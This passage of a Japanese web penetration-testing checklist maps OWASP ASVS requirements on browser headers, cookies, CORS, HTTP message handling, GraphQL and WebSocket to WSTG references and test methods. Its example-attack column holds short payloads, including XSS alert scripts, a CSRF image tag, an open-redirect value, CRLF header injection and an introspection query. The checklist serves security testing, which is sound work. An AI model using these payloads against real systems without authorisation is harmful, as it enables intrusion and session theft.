| V3.2.1 | L1 | 不正コンテキストでのレンダリング防止（Sec-Fetch系/Content-Disposition: attachment/CSP sandbox 等） | 対応可 | レスポンスヘッダ/フェッチメタの検証とファイル直参照試験 | [WSTG-CONF-13](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations)/[MDN: X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options)/[MDN: Content-Disposition](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition)/[MDN: CSP sandbox](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox) | HTMLを含むユーザアップロードを`Content-Disposition: inline`かつ`nosniff`なしで配信しXSS発火 | `Content-Type/Disposition/CSP`等の有無を確認し、直参照/iframe埋込でスクリプト実行可否を検証 |
| V3.2.2 | L1 | テキスト表示は安全API（createTextNode/textContent等）でHTML/JS実行を防止 | 対応可 | 反射/保存型XSS観点でUI出力の挙動確認 | [WSTG-CLNT-01](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting)/[PortSwigger WSA](https://portswigger.net/web-security/cross-site-scripting/dom-based)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/)/[CWE-79](https://cwe.mitre.org/data/definitions/79.html) | 入力をそのまま`innerHTML`に流し`<script>alert(1)</script>`が実行 | 反射/保存箇所でDOM操作先を特定し、DOM型XSSペイロードで実行成立を確認 |
| V3.2.3 | L3 | DOM clobbering回避（厳密宣言/型/グローバル汚染防止/名前空間分離） | 対応可 | 既知ペイロードでのUI破壊可否/コンソール警告観察 | [WSTG-CLNT-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution)/[PortSwigger: DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)/[OWASP DOM Clobbering Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html) | フォーム要素名で`window.location`等を上書きしイベントハンドラ挙動を乗っ取り | DOM要素名/ID衝突を誘発する入力でJS実行/挙動変化を観測 |


---

## V3.3 クッキーセットアップ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V3.3.1 | L1 | Secure属性必須。__Host-未使用時は__Secure-を使用 | 対応可 | Set-Cookieの属性/プレフィックス検証 | [WSTG-SESS-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)/[MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)/[MDN: Cookie prefixes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#cookie_prefixes) | HTTP経由で`Set-Cookie: session=...; Secure`なし→中間者で漏洩 | すべての`Set-Cookie`に`Secure`が付与されているか、HTTP応答が存在しないかを確認 |
| V3.3.2 | L2 | SameSiteを目的に応じて設定（CSRF曝露を低減） | 対応可 | クロスサイト送信/iframe等で挙動確認 | [WSTG-SESS-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)/[MDN: SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite_attribute)/[PortSwigger WSA](https://portswigger.net/web-security/csrf)/[OWASP CSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) | `SameSite`未設定のセッションクッキーで`<form target>`や`<img>`経由のCSRFが成立 | クロスサイトからの自動送信でクッキー送出有無とサーバ側の真正性検証の結果を確認 |
| V3.3.3 | L2 | 共有不要な機密クッキーは__Host-プレフィックス | 対応可 | ドメイン/Path非指定と併せて検証 | [WSTG-SESS-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)/[MDN: Cookie prefixes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#cookie_prefixes)/[MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie) | サブドメインで緩い`Domain`属性のクッキーを設定し上位ドメインの認証を汚染 | `__Host-`使用の有無、`Domain`未指定/`Path=/`の組合せでスコープ汚染不可を確認 |
| V3.3.4 | L2 | セッショントークン等はHttpOnlyでJSから不可視 | 対応可 | JSからのアクセス可否/ヘッダ確認 | [WSTG-SESS-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)/[MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)/[MDN: Document.cookie](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) | `document.cookie`でセッションIDを窃取 | `HttpOnly`付与の有無とJSからの取得可否を確認 |
| V3.3.5 | L3 | クッキー長（名+値）≤4096B | 対応可 | 実値の概算・複数クッキーの合計検証 | [WSTG-SESS-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)/[RFC 6265 §6.1](https://datatracker.ietf.org/doc/html/rfc6265#section-6.1)/[MDN: Cookies Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies) | 大量/長大なクッキーで送信失敗や切捨て→認証不整合 | `Set-Cookie`総量とブラウザ送信挙動を観察し欠落/切捨ての有無を確認 |

---

## V3.4 ブラウザのセキュリティメカニズムヘッダ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V3.4.1 | L1 | HSTS有効（max-age≥1年）。L2+はincludeSubDomains | 対応可 | すべてのレスポンスでHSTS確認/初回HTTP遮断確認 | [WSTG-CONF-13](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations)/[WSTG-CONF-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security)/[MDN: Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security) | 初回アクセスを`http://`で試行しダウングレード許容を確認 | `Strict-Transport-Security`の有無/値、HTTPからの強制HTTPS化を検証 |
| V3.4.2 | L1 | CORSの許可は固定or厳密許可リスト。`*`は機密非含有時のみ | 対応可 | ACAO/ACAC/Originの相関確認 | [WSTG-CLNT-09](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)/[PortSwigger WSA](https://portswigger.net/web-security/cors)/[MDN: ACAO](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Origin) | `Origin: https://evil.tld`でプリフライト/本リクエストが許可されるか検証 | `ACAO/ACAC/Vary: Origin`等の整合と機密レスポンス暴露の有無を確認 |
| V3.4.3 | L2 | CSP導入（最低：object-src 'none', base-uri 'none'）。L3はナンス/ハッシュで応答ごと | 対応可 | ポリシー妥当性/違反発生有無を検証 | [WSTG-CONF-13](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations)/[OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)/[MDN: CSP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) | `script-src`緩すぎにより外部JS読込やインライン実行が可能 | CSP違反を誘発/観測（レポート/実挙動）し許容範囲を評価 |
| V3.4.4 | L2 | X-Content-Type-Options: nosniff を全レスポンスに付与 | 対応可 | MIMEと実コンテンツ整合/ヘッダ確認 | [WSTG-CONF-13](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations)/[MDN: X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options)/[MDN: MIME type verification](https://developer.mozilla.org/en-US/docs/Web/HTTP/Browser_detection_using_the_user_agent#mime_type_verification) | `text/plain`と偽装したHTMLが`nosniff`未設定で実行 | ヘッダ有無とブラウザでの解釈差（実行/非実行）を確認 |
| V3.4.5 | L2 | Referrer-Policyで機密の外部漏えい防止 | 対応可 | 内部→外部遷移時のReferer挙動確認 | [WSTG-CONF-13](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations)/[MDN: Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) | 機密クエリを含むURLから外部サイトへ遷移しRefererで漏えい | ポリシー値と実際の送信値（ネットワーク面）を検証 |
| V3.4.6 | L2 | frame-ancestorsで埋め込み制御（X-Frame-Options非推奨） | 対応可 | クリックジャッキング検査/埋込可否確認 | [WSTG-CLNT-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy)/[PortSwigger WSA](https://portswigger.net/web-security/clickjacking) | 悪性サイトで透明iframeに埋込しクリックを誘導 | iframe埋込可否とオーバーレイでのクリック誘導成立を検証 |
| V3.4.7 | L3 | CSPの違反送信先（report-to/report-uri）定義 | 対応可 | 違反トリガでレポート送信可否を確認 | [WSTG-CONF-13](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy)/[MDN: CSP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) | 意図的にCSP違反を発生させ、レポートの送信/内容を確認 | レポートエンドポイントへの到達/記録を確認 |
| V3.4.8 | L3 | COOP（same-origin/…-allow-popups）でタブ分離 | 対応可 | ヘッダ確認とナビゲーション挙動観察 | [WSTG-CONF-13](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)/[MDN: COOP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Opener-Policy) | COOP未設定環境でタブ間の`window.opener`共有を悪用 | ヘッダ有無/値とブラウザ挙動（opener切断）を検証 |

---

## V3.5 ブラウザのオリジン分離

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V3.5.1 | L1 | CORS非依存時はCSRFトークン/追加ヘッダで真正性検証 | 対応可 | CSRFトークン有無/検証強度・二重送信可否 | [WSTG-SESS-08](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)/[PortSwigger WSA](https://portswigger.net/web-security/csrf)/[OWASP CSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) | `<img src="/transfer?to=attacker&amt=1000">`でGET副作用を誘発 | トークン欠如/検証不備でクロスサイト起因の状態変更が成立するか確認 |
| V3.5.2 | L1 | CORS依存時はプリフライト回避リクエストで呼べない設計 | 対応可 | `Origin/Content-Type`/追加ヘッダ要件の検証 | [WSTG-CLNT-09](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods)/[PortSwigger WSA](https://portswigger.net/web-security/cors)/[MDN: CORS Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS) | `Content-Type: text/plain`かつカスタムヘッダなしで機密APIにアクセス | プリフライト不要条件で呼べない/拒否されることを確認 |
| V3.5.3 | L1 | 機密操作は安全でないHTTPメソッド（GET等）を使用しない or Sec-Fetch厳格検証 | 対応可 | メソッド/Fetchメタ検証・画像等経由の誤呼び出し検査 | [owasp](https://owasp.org/www-project-secure-headers/)/[MDN: HTTP methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) | 削除APIがGETで実装され`<img src="/delete?id=1">`で副作用 | HTTPメソッドの適否/冪等性とブラウザ経由での誤呼び出し成立を確認 |
| V3.5.4 | L2 | 異アプリは異ホストで分離しSOPを活用 | 対応可 | ホスト名/クッキースコープ/サブドメイン分離確認 | [WSTG-SESS-02](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)/[MDN: Cookie prefixes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#cookie_prefixes) | サブドメインから親ドメインCookieを設定してセッション汚染 | Cookieの`Domain`/`Path`/`__Host-`運用で越境不可を検証 |
| V3.5.5 | L2 | postMessageはorigin/構文検証し不正は破棄 | 対応可 | UI操作でpostMessage経路を観測 | [WSTG-CLNT-11](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging)/[MDN: postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) | 悪性オリジンから`postMessage({admin:true},"*")`送信 | 受信側の`event.origin`検証とメッセージ検証欠如により挙動変化を確認 |
| V3.5.6 | L3 | JSONPを無効化（XSSI耐性） | 対応可 | `callback=`等の挙動確認/JSONPレス無効を確認 | [WSTG-CLNT-13](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/13-Testing_for_Cross_Site_Script_Inclusion)/[PortSwigger WSA (XSSI)](https://portswigger.net/web-security/cross-site-scripting)/[PortSwigger Research](https://portswigger.net/research/json-hijacking-for-the-modern-web) | `<script src="/api?callback=alert">`で任意関数実行 | Scriptタグ経由でのJSONP応答実行可否/XSSI対策有無を確認 |
| V3.5.7 | L3 | 認可データをJS資産レスポンスに含めない（XSSI防止） | 対応可 | 認可要データの取得経路/ヘッダ制御確認 | [WSTG-CLNT-13](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/13-Testing_for_Cross_Site_Script_Inclusion)/[PortSwigger WSA (XSSI)](https://portswigger.net/web-security/cross-site-scripting)/[PortSwigger Research](https://portswigger.net/research/json-hijacking-for-the-modern-web) | 認証必須JSONを`<script src>`で読込みし先頭に`)]}',`が無くデータ露出 | 資産種別/ヘッダ/先頭プレフィクス有無の確認でXSSI耐性を評価 |
| V3.5.8 | L3 | 認証済みリソースの埋込は意図時のみ（Sec-Fetch厳格 or CORP） | 対応可 | 埋込試行とヘッダ（CORP等）検証 | [MDN: CORP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Resource-Policy)/[MDN: CORP Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cross-Origin_Resource_Policy)/[MDN: Sec-Fetch-Site](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Sec-Fetch-Site)/[OWASP](https://owasp.org/www-project-secure-headers/) | 他オリジンから`<img/src>`等で認証済み画像/JSONを埋込し取得 | `Cross-Origin-Resource-Policy`等の有無/効果で越境読み出し制御を確認 |

---

## V3.6 外部リソース完全性

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V3.6.1 | L3 | 外部配信の資産はSRI＋固定版管理。不可なら根拠を文書化 | 対応可 | `<link>/<script>`のSRI有無と固定版確認 | [MDN: SRI](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)/[MDN: script**integrity**](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script#attr-integrity) | CDN上のJSを改竄しインライン差替えを誘発 | `integrity`属性/固定版（ハッシュ/固定URL）確認とSRI不一致時の拒否を検証 |

---

## V3.7 ブラウザのセキュリティに関するその他の考慮事項

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
| V3.7.1 | L2 | 廃止/非安全なクライアント技術の不使用（Flash/ActiveX等） | 対応可 | 資産スキャン/機能確認で残存技術の検出 | [WSTG-CLNT](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing)/[MDN: Plugin (Glossary)](https://developer.mozilla.org/en-US/docs/Glossary/Plugin) | `flashvars=`やActiveX呼出しの残存 | 静的資産/レスポンス内の古い技術参照を検出 |
| V3.7.2 | L2 | 自動リダイレクトは許可リスト先のみ | 対応可 | オープンリダイレクト検査＋許可先確認 | [WSTG-CLNT-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect)/[PortSwigger WSA](https://portswigger.net/web-security/dom-based/open-redirection) | `next=//evil.tld`や`next=javascript:alert(1)`で遷移 | URLパラメータ操作で外部/危険スキーム遷移が成立するか確認 |
| V3.7.3 | L3 | 外部遷移時に警告とキャンセル手段を提供 | 対応可 | 外部リンク遷移UI/警告表示の確認 | [WSTG-CLNT-04](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect)/[PortSwigger WSA](https://portswigger.net/web-security/dom-based/open-redirection) | 機密画面から外部サイトへ直接遷移し警告なし | 外部リンク押下時の中間確認/警告の有無を確認 |
| V3.7.4 | L3 | ルートドメインのHSTSプリロードリスト登録 | 対応可 | `Strict-Transport-Security`とpreload状況の確認 | [WSTG-CONF-13](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security)/[HSTS Preload](https://hstspreload.org/) | `http://`直打ちで初回からHTTPS強制されない | HSTS値（`preload`要件）とブラウザのプリロード挙動を確認 |
| V3.7.5 | L3 | 想定機能を未サポートのブラウザでは文書通りの動作（警告/遮断） | 範囲外 | 仕様・運用確認 | - | - | - |

# V4 Webサービス

## V4.1 一般的な Web サービスセキュリティ

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V4.1.1 | L1 | Content-Type と実体の一致（文字エンコーディング含む） | 対応可 | 各APIレスの Content-Type/charset とボディ検証 | [WSTG-CONF-14](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations)/[PortSwigger WSA](https://portswigger.net/kb/issues/00200308_content-type-incorrectly-stated)/[MDN X-Content-Type-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options) | `application/json` なのに HTML を返しブラウザがスニッフィングしてスクリプト実行、`X-Content-Type-Options` 未設定 | レスポンスの `Content-Type` と実体のパース可否・`nosniff` 有無を確認（不一致/スニッフィング許容なら検出） |
| V4.1.2 | L2 | 人手UI向けのみ HTTP→HTTPS リダイレクト許容 | 対応可 | APIエンドポイントのHTTP許容/自動リダイレクト有無確認 | [WSTG-CONF-07](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security)/[PortSwigger WSA](https://portswigger.net/kb/issues/01000300_strict-transport-security-not-enforced)/[MDN HSTS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)/[HSTS Preload](https://hstspreload.org/) | `http://api.example.com` へ送信すると 301/302 で HTTPS に誘導される（初回平文露出） | 平文HTTPで到達・リダイレクト挙動や HSTS の有無を確認（HTTP許容や初回平文があれば検出） |
| V4.1.3 | L3 | 受信ヘッダの上書き防止（X-Forwarded-*, X-User-ID等） | 対応可 | 任意ヘッダ注入→アプリ側解釈の確認 | [WSTG-INPV-17](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)/[PortSwigger WSA](https://portswigger.net/web-security/host-header)/[PortSwigger WSA](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)/[CWE-346](https://cwe.mitre.org/data/definitions/346.html) | `Host`/`X-Forwarded-Host` を改ざんしパスワードリセットURL改ざん、キャッシュ汚染 | ヘッダ改変で絶対URLやログ・メールに反映/機能誤動作があれば検出 |
| V4.1.4 | L3 | サポートHTTPメソッドのみ許可（未使用は拒否） | 対応可 | TRACE/PUT/DELETE など無効メソッド試行 | [WSTG-CONF-06](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods)/[PortSwigger WSA](https://portswigger.net/kb/issues/00500a00_http-trace-method-is-enabled)/[PortSwigger WSA](https://portswigger.net/burp/documentation/desktop/testing-workflow/analyzing/supported-http-methods)/[CWE-650](https://cwe.mitre.org/data/definitions/650.html) | `PUT` でファイル設置、`TRACE` による XST、`X-HTTP-Method-Override` の悪用 | 各メソッドを送信し 200/動作変化なら検出（405/501 以外や機能実行は不許可） |
| V4.1.5 | L3 | 重要トランザクションにメッセージ署名 | 範囲外 | 仕様/運用ヒアリング中心 | - | - | - |

## V4.2 HTTP メッセージ構造バリデーション

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V4.2.1 | L2 | 受信メッセージ境界の厳格化（TE/CL競合処理等） | 対応可 | TE/CL両立ペイロードやH2/H3差異での挙動確認 | [WSTG-INPV-15](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling)/[PortSwigger WSA](https://portswigger.net/web-security/request-smuggling)/[PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/Request%20Smuggling/)/[CWE-444](https://cwe.mitre.org/data/definitions/444.html) | `Content-Length` と `Transfer-Encoding: chunked` 併用でリクエストスマグリング（前段/後段乖離） | 差分ペイロードで前段200/後段404等の不整合・遅延/分割応答が出れば検出 |
| V4.2.2 | L3 | 送信時に Content-Length と実フレーム長の不整合回避 | 範囲外 | 生成側制御のため黒箱では限定的 | - | - | - |
| V4.2.3 | L3 | H2/H3で接続固有ヘッダを送受信しない | 対応可 | H2/H3で Transfer-Encoding 等混入の有無確認 | [WSTG-INPV-15](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling)/[PortSwigger WSA](https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors)/[PortSwigger Research](https://portswigger.net/research/http2)/[CWE-444](https://cwe.mitre.org/data/definitions/444.html) | HTTP/2 で `TE`/`Transfer-Encoding` を混入させプロキシ誤解釈→スマグリング | H2 経路で禁止ヘッダを送信し受理/不整合挙動があれば検出 |
| V4.2.4 | L3 | ヘッダ値にCR/LF/CRLFを許容しない | 対応可 | ヘッダインジェクション試行→レス分割/改変の有無 | [WSTG-INPV-15](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling)/[PortSwigger WSA](https://portswigger.net/kb/issues/00200200_http-response-header-injection)/[CWE-113](https://cwe.mitre.org/data/definitions/113.html) | `%0d%0aSet-Cookie: evil=1` 混入でレスポンス分割/任意ヘッダ付与 | 改行混入で新規ヘッダ/二重レス生成を確認できれば検出 |
| V4.2.5 | L3 | 過長URI/ヘッダ生成の抑止（DoS回避） | 対応可 | 長大クエリ/クッキーでの閾値・エラー挙動確認 | [WSTG-INPV-13](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Buffer_Overflow)/[CWE-400](https://cwe.mitre.org/data/definitions/400.html)/[MDN 414](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/414)/[MDN 431](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/431) | 10KB超の `Cookie`/長大URI送信で 413/400/タイムアウト誘発 | サイズ増加で応答コード/遅延・接続切断など閾値超過の挙動確認で検出 |


## V4.3 GraphQL

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V4.3.1 | L2 | クエリ許可リスト/深さ・コスト制限でDoS防止 | 対応可 | ネスト/フラグメント乱用での応答時間・リジェクト確認 | [WSTG-APIT-01](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL)/[PortSwigger WSA](https://portswigger.net/web-security/graphql)/[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)/[CWE-400](https://cwe.mitre.org/data/definitions/400.html) | 深いネスト/大量フラグメントで高コストクエリを連発し処理枯渇 | 429/400 やエラー文言（max depth/complexity）・顕著な遅延発生で検出 |
| V4.3.2 | L2 | 本番での introspection 無効（公開意図なければ） | 対応可 | `__schema`/`__type` クエリ応答可否 | [WSTG-APIT-01](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL)//[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)/[CWE-200](https://cwe.mitre.org/data/definitions/200.html) | `{"query":"{__schema{types{name}}}"}` でスキーマ全公開 | introspection が 200/スキーマ返却なら検出、403/無効化が期待 |

## V4.4 WebSocket

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :--- | :--- | :--- |
| V4.4.1 | L1 | すべて WSS を使用 | 対応可 | `ws://` 拒否/`wss://` 強制確認 | [WSTG-CLNT-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)/[PortSwigger WSA](https://portswigger.net/web-security/websockets)/[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets)/[MDN WebSockets](https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API/Writing_WebSocket_client_applications) | `ws://` 許可で平文盗聴/改ざん | DevTools/プロキシで `ws://` 接続が成立すれば検出（`wss://` 強制が期待） |
| V4.4.2 | L2 | ハンドシェイク時の Origin 検証 | 対応可 | 異オリジンからの接続試行と拒否確認 | [WSTG-CLNT-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)/[PortSwigger WSA](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)/[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets)/[CWE-346](https://cwe.mitre.org/data/definitions/346.html) | 悪性サイトから CSWSH（Cross-Site WebSocket Hijacking） | 異オリジンで `Origin` 任意値を送信し接続成功なら検出 |
| V4.4.3 | L2 | 標準セッション不可時は専用トークンで管理 | 対応可 | トークン要求/失効/再接続挙動の確認 | [WSTG-CLNT-10 / WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)/[PortSwigger WSA](https://portswigger.net/web-security/websockets)/[CWE-613](https://cwe.mitre.org/data/definitions/613.html) | 失効済/他ユーザの JWT/トークンで WS 接続継続・操作可能 | 無効化後も接続継続/権限越え可能なら検出（トークン検証/失効不備） |
| V4.4.4 | L2 | 専用WSトークンは既存HTTPSセッションを基盤に取得/検証 | 対応可 | 認証連携の流れとバインド確認 | [WSTG-CLNT-10 / WSTG-SESS-10](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)/[PortSwigger WSA](https://portswigger.net/web-security/websockets)/[CWE-287](https://cwe.mitre.org/data/definitions/287.html) | 盗んだトークンを別端末/未認証状態から使用し接続成立 | HTTPS セッションとトークンのバインド欠如（他環境で再利用可）で検出 |

# V5 ファイル処理

## V5.1 ファイル処理ドキュメント

| 章/要件ID | レベル | 要点 | 対応可否 | WebPTでの扱い | WSTG | 具体的な攻撃例 | 精査方法 |
| :---: | :---: | :--- | :---: | :--- | :---: | :--- | :--- |
